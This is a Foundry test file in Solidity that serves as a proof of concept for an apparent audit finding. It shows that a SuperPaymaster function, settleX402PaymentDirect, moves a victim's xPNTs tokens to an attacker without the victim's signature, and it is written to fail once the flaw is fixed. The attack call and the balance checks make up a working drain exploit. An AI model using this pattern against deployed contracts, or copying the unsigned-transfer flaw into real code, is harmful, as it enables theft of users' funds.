// PoC_C02 — Unsigned direct drain
// VULNERABILITY: settleX402PaymentDirect transfers a victim's xPNTs to a caller-chosen recipient without any victim signature.
// TEST PASSES = vulnerability exists on current code
// TEST SHOULD FAIL/REVERT after fix
// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "src/paymasters/superpaymaster/v3/SuperPaymaster.sol";
import "src/tokens/xPNTsToken.sol";
import "@account-abstraction-v7/interfaces/IEntryPoint.sol";
import "@openzeppelin-v5.0.2/contracts/proxy/Clones.sol";
import "@openzeppelin-v5.0.2/contracts/token/ERC20/ERC20.sol";
import {UUPSDeployHelper} from "../helpers/UUPSDeployHelper.sol";
import {MockXPNTsFactory} from "../helpers/MockXPNTsFactory.sol";

contract C02Registry {
    mapping(bytes32 => mapping(address => bool)) public roles;

    function setRole(bytes32 role, address account, bool value) external {
        roles[role][account] = value;
    }

    function hasRole(bytes32 role, address account) external view returns (bool) {
        return roles[role][account];
    }

    function getCreditLimit(address) external pure returns (uint256) {
        return 0;
    }
}

contract C02EntryPoint {}

contract C02PriceFeed {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (1, 2000 * 1e8, 0, block.timestamp, 1);
    }

    function decimals() external pure returns (uint8) {
        return 8;
    }
}

contract C02APNTs is ERC20 {
    constructor() ERC20("aPNTs", "aPNT") {}
}

contract PoC_C02_UnsignedDrain_Test is Test {
    using Clones for address;

    SuperPaymaster public paymaster;
    C02Registry public registry;
    xPNTsToken public xpnts;

    address public owner = address(0xC0201);
    address public treasury = address(0xC0202);
    address public attacker = address(0xC0203);
    address public victim = address(0xC0204);

    bytes32 public constant C02_ROLE_PAYMASTER_SUPER = keccak256("PAYMASTER_SUPER");

    function setUp() public {
        vm.startPrank(owner);

        registry = new C02Registry();
        C02EntryPoint entryPoint = new C02EntryPoint();
        C02PriceFeed priceFeed = new C02PriceFeed();
        C02APNTs apnts = new C02APNTs();

        paymaster = UUPSDeployHelper.deploySuperPaymasterProxy(
            IEntryPoint(address(entryPoint)),
            IRegistry(address(registry)),
            address(priceFeed),
            owner,
            address(apnts),
            treasury,
            3600
        );

        address xImpl = address(new xPNTsToken());
        xpnts = xPNTsToken(xImpl.clone());
        xpnts.initialize("Community Points", "xPNT", owner, "Community", "community.eth", 1e18);
        xpnts.setSuperPaymasterAddress(address(paymaster));
        xpnts.addApprovedFacilitator(attacker);
        xpnts.mint(victim, 1_000 ether);

        MockXPNTsFactory mockFactory = new MockXPNTsFactory();
        paymaster.setXPNTsFactory(address(mockFactory));
        paymaster.setOperatorFacilitatorFee(attacker, 100);
        registry.setRole(C02_ROLE_PAYMASTER_SUPER, attacker, true);

        vm.stopPrank();
    }

    function test_PoC_directSettlementDrainsVictimWithoutSignature() public {
        uint256 amount = 100 ether;
        bytes32 nonce = bytes32(uint256(0xC02));

        uint256 victimBefore = xpnts.balanceOf(victim);
        uint256 attackerBefore = xpnts.balanceOf(attacker);

        vm.prank(attacker);
        bytes32 settlementId = paymaster.settleX402PaymentDirect(victim, attacker, address(xpnts), amount, nonce);

        uint256 fee = (amount * 100) / 10_000;
        assertTrue(settlementId != bytes32(0), "settlement should succeed without victim signature");
        assertEq(xpnts.balanceOf(victim), victimBefore - amount, "victim balance must decrease");
        assertEq(xpnts.balanceOf(attacker), attackerBefore + amount - fee, "attacker must receive amount minus fee");
    }
}
